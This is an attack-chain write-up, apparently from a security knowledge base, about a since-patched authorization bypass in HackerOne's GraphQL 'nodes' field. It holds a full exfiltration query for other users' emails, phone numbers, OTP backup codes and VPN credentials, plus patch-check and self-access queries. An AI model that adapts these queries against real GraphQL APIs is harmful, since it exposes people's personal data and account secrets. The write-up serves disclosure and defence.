---
tags:
  - graphql
  - information-disclosure
  - authorization-bypass
type: attack_chain
tools:
  - '[[tools/graphql-ruby]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/graphql-safe-query-edges]]'
  - '[[commands/graphql-vulnerable-query-nodes]]'
  - '[[commands/graphql-user-data-leak-query]]'
  - '[[commands/graphql-self-otp-query]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Exploit-GraphQL-Nodes-Field-for-User-Data-Leakage]]'
  - '[[procedures/Validate-GraphQL-Patch-Effectiveness]]'
  - '[[procedures/Access-Own-OTP-Backup-Codes-via-GraphQL-Query]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Information Repositories]]'
description: >-
  Multi-stage attack exploiting improper access controls in HackerOne's GraphQL
  endpoint to access confidential user data and metadata.
skill_level: intermediate
impact_level: high
id: e656fba6-eadb-4b36-98ba-b96079d90d3a
created_at: '2025-12-11T06:10:40.243Z'
updated_at: '2025-12-11T06:10:40.243Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0009]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1213]]'
---
# GraphQL Information Disclosure via Nodes Field Authorization Bypass

## Overview

This attack chain demonstrates the exploitation of a vulnerability in HackerOne's GraphQL endpoint caused by improper access controls on the 'nodes' field after a migration to a class-based implementation. The attack allows unauthorized access to sensitive user data such as emails, phone numbers, and OTP backup codes, as well as limited metadata from programs and reports. The chain includes demonstrating the vulnerability, validating the patch, and reporting a related self-access issue.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Exploitation] --> B[Patch Validation]
    B --> C[Related Self-Access Query]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/graphql-ruby]]

### Target Environment

- Target OS/Platform: Web
- Required services/ports: GraphQL endpoint
- Network access requirements: Access to the HackerOne GraphQL API

### Initial Access Requirements

- Credential requirements: Valid HackerOne account for authenticated queries
- Network position: External access to the public endpoint
- Prior access needed: None beyond standard user access

## Detailed Attack Procedures

### Step 1: Demonstrate Information Disclosure - [[procedures/Exploit-GraphQL-Nodes-Field-for-User-Data-Leakage]]

**Procedure**: [[procedures/Exploit-GraphQL-Nodes-Field-for-User-Data-Leakage]]

**Objective**: Exploit the 'nodes' field in GraphQL queries to bypass authorization and access sensitive user data.

**Expected Output**: Retrieval of confidential data like emails, phone numbers, and OTP codes.

**Success Indicators**:
- Successful query response with sensitive attributes
- No authorization errors in the response

**Instructions**:

Craft and execute the GraphQL query using [[commands/graphql-user-data-leak-query]] to fetch sensitive user information via the 'nodes' field:

```graphql
{
  id
  users()
  {
    total_count
    nodes
    {
      _id
      name
      username
      email
      account_recovery_phone_number
      account_recovery_unverified_phone_number
      bounties
      {
        total_amount
      }
      otp_backup_codes
      i_can_update_username
      location
      year_in_review_published_at
      anc_triager
      blacklisted_from_hacker_publish
      calendar_token
      vpn_credentials
      {
        name
      }
      account_recovery_phone_number_sent_at
      account_recovery_phone_number_verified_at
      swag
      {
        total_count
      }
      totp_enabled
      subscribed_for_team_messages
      subscribed_for_monthly_digest
      sessions
      {
        total_count
      }
      facebook_user_id
      unconfirmed_email
    }
  }
}
```

Verify the output contains unauthorized data without errors.

### Step 2: Validate Patch - [[procedures/Validate-GraphQL-Patch-Effectiveness]]

**Procedure**: [[procedures/Validate-GraphQL-Patch-Effectiveness]]

**Objective**: Confirm that the vulnerability has been patched by re-attempting the query and observing an error.

**Expected Output**: GraphQL error response indicating authorization failure.

**Success Indicators**:
- Error message from the endpoint
- No sensitive data returned

**Instructions**:

Re-execute the vulnerable query using [[commands/graphql-vulnerable-query-nodes]] post-patch:

```graphql
query {
  users() {
    nodes {
      email
    }
  }
}
```

Observe the error response to confirm the fix.

### Step 3: Report Related Self-Access Issue - [[procedures/Access-Own-OTP-Backup-Codes-via-GraphQL-Query]]

**Procedure**: [[procedures/Access-Own-OTP-Backup-Codes-via-GraphQL-Query]]

**Objective**: Query own user data to access OTP backup codes, highlighting a potential related issue.

**Expected Output**: Retrieval of hashed OTP backup codes for the current user.

**Success Indicators**:
- Successful retrieval of own OTP codes
- Confirmation if this access is intended or a residual issue

**Instructions**:

Execute the self-query using [[commands/graphql-self-otp-query]]:

```graphql
{
  me{
    _id #388246
    id #gid://hackerone/User/388246
    otp_backup_codes
    username
  }
}
```

Review the output for hashed OTP codes.

## Attack Chain Summary

### Key Achievements

1. Unauthorized access to sensitive user and program data
2. Validation of patch effectiveness
3. Identification of related self-access vulnerability

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Data from Information Repositories]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

*Last updated: 2023-10-01*
